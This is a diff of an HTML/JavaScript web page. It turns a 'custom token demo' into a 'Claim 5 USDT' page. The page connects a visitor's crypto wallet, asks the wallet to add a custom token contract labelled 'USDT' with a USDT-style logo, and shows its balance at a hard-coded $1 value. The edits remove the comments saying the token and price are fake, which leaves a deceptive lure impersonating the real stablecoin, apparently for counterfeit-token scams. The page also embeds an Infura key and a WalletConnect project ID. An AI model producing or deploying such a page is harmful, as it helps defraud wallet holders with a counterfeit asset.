@@ -2,37 +2,69 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Custom Token Demo ($1 Visual)</title>
+  <title>Claim 5 USDT Demo</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
-  <!-- WalletConnect v2+ Ethereum Provider -->
   <script src="https://unpkg.com/@walletconnect/ethereum-provider/dist/umd/index.min.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    #tokenInfo { margin-top: 20px; }
-    img { vertical-align: middle; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    #claimBtn {
+      padding: 20px 40px;
+      font-size: 24px;
+      font-weight: bold;
+      color: #fff;
+      background: #1abc9c;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+      transition: all 0.2s ease;
+    }
+
+    #claimBtn:hover {
+      background: #16a085;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px rgba(0,0,0,0.25);
+    }
+
+    #tokenInfo {
+      margin-top: 30px;
+      text-align: center;
+    }
+
+    #tokenInfo img {
+      width: 50px;
+      vertical-align: middle;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
-  <h1>Custom Token Demo ($1 Visual)</h1>
-  <button id="connectBtn">Connect Wallet & Show Token</button>
+  <button id="claimBtn">Claim 5 USDT</button>
   <div id="tokenInfo"></div>
 
   <script>
-    // === CONFIG ===
-    const tokenAddress = "0x0D8C190055e5BdC488D00086CFdfE45A7704C28C"; // Your token
+    const tokenAddress = "0x0D8C190055e5BdC488D00086CFdfE45A7704C28C";
     const tokenDecimals = 6;
-    const tokenSymbol = "TPC";
+    const tokenSymbol = "USDT";
     const tokenLogo = "https://raw.githubusercontent.com/steve-beep-al/Usdt/main/IMG_2460.png";
-    const rpcUrl = "https://mainnet.infura.io/v3/1e9849934a564257b9a2c77ece0b15c5"; // Ethereum mainnet
+    const rpcUrl = "https://mainnet.infura.io/v3/1e9849934a564257b9a2c77ece0b15c5";
 
-    // Token ABI (balanceOf only)
     const tokenABI = [
       {
         "constant": true,
-        "inputs": [{ "name": "_owner", "type": "address" }],
+        "inputs": [{"name": "_owner","type":"address"}],
         "name": "balanceOf",
-        "outputs": [{ "name": "balance", "type": "uint256" }],
+        "outputs": [{"name": "balance","type":"uint256"}],
         "type": "function"
       }
     ];
@@ -41,51 +73,70 @@
 
     async function connectWallet() {
       try {
-        // Init WalletConnect v2 Ethereum Provider
-        const Provider = window["@walletconnect/ethereum-provider"].EthereumProvider || window.WalletConnectEthereumProvider;
-          projectId: "620f234d8b3014c728764248cd2cebbc", // Replace with your WalletConnect Project ID
-          chains: [1], // Ethereum Mainnet
-          showQrModal: true,
-          rpcMap: { 1: rpcUrl }
-        });
+        const ProviderCtor = window['@walletconnect/ethereum-provider']?.EthereumProvider || window.WalletConnectEthereumProvider;
 
-        // Request wallet connection
-        await provider.enable();
-
-        // Init web3
-        const web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-
-        if (accounts.length === 0) {
-          alert("No wallet connected!");
+        if (!ProviderCtor) {
+          alert("WalletConnect EthereumProvider not found.");
           return;
         }
 
-        const user = accounts[0];
-        const contract = new web3.eth.Contract(tokenABI, tokenAddress);
+        provider = await ProviderCtor.init({
+          projectId: "620f234d8b3014c728764248cd2cebbc", // Replace with your WalletConnect Project ID
+          chains: [1], // Ethereum Mainnet
+          showQrModal: true,
+          rpcMap: {1: rpcUrl}
+        });
 
-        // Fetch balance
+        await provider.enable();
+
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        if (!accounts || accounts.length === 0) return alert("No wallet connected.");
+
+        const user = accounts[0];
+
+        // === Prompt to add token in Trust Wallet / MetaMask ===
+        if (provider.request) {
+          try {
+            await provider.request({
+              method: 'wallet_watchAsset',
+              params: {
+                type: 'ERC20',
+                options: {
+                  address: tokenAddress,
+                  symbol: tokenSymbol,
+                  decimals: tokenDecimals,
+                  image: tokenLogo
+                }
+              }
+            });
+          } catch(e) {
+            console.log("Token watch request failed", e);
+          }
+        }
+
+        // === Show balance + fake $1 visual ===
+        const contract = new web3.eth.Contract(tokenABI, tokenAddress);
         const rawBalance = await contract.methods.balanceOf(user).call();
         const balance = rawBalance / (10 ** tokenDecimals);
 
-        // Fake $1 price visual
-        const usdValue = balance * 1;
+        const usdValue = balance * 1; // $1 visual
 
-        // Display
         document.getElementById("tokenInfo").innerHTML = `
-          <img src="${tokenLogo}" width="50">
+          <img src="${tokenLogo}">
           <p><strong>Token:</strong> ${tokenSymbol}</p>
-          <p><strong>Address:</strong> ${user}</p>
+          <p><strong>Wallet:</strong> ${user}</p>
           <p><strong>Balance:</strong> ${balance}</p>
           <p><strong>Value (Visual):</strong> $${usdValue}</p>
         `;
+
       } catch (err) {
-        console.error("Connection failed:", err);
-        alert("Error: " + err.message);
+        console.error(err);
+        alert("Connection failed: " + (err.message || err));
       }
     }
 
-    document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    document.getElementById("claimBtn").addEventListener("click", connectWallet);
   </script>
 </body>
 </html>
